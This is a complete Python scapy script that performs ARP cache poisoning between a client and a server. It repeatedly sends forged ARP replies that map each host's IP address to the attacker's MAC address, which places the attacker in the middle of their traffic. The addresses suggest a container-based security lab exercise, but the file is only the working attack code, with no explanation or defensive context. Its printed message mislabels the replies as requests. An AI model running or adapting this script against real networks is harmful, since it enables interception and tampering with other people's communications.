#!/usr/bin/python

from scapy.all import *
from time import  *

VM_CLIENT_IP = "10.9.0.6"
VM_CLIENT_MAC = "02:42:0a:09:00:06" 
VM_SERVER_IP = "10.9.0.5"
VM_SERVER_MAC = "02:42:0a:09:00:05"
VM_ATTACKER_IP = "10.9.0.105"
VM_ATTACKER_MAC = "02:42:0a:09:00:69"

Ea = Ether()
Ea.dst = VM_CLIENT_MAC
Aa = ARP()
Aa.psrc = VM_SERVER_IP
Aa.hwsrc = VM_ATTACKER_MAC
Aa.op = 2
pkta = Ea/Aa

Eb = Ether ()
Eb.dst = VM_SERVER_MAC
Ab = ARP()
Ab.psrc = VM_CLIENT_IP
Ab.hwsrc = VM_ATTACKER_MAC
Ab.op = 2
pktb = Eb/Ab

while 1:
   print("Sending spoofed ARP request to Hosts A and B")
   sendp(pkta)
   sendp(pktb)
   sleep(4)
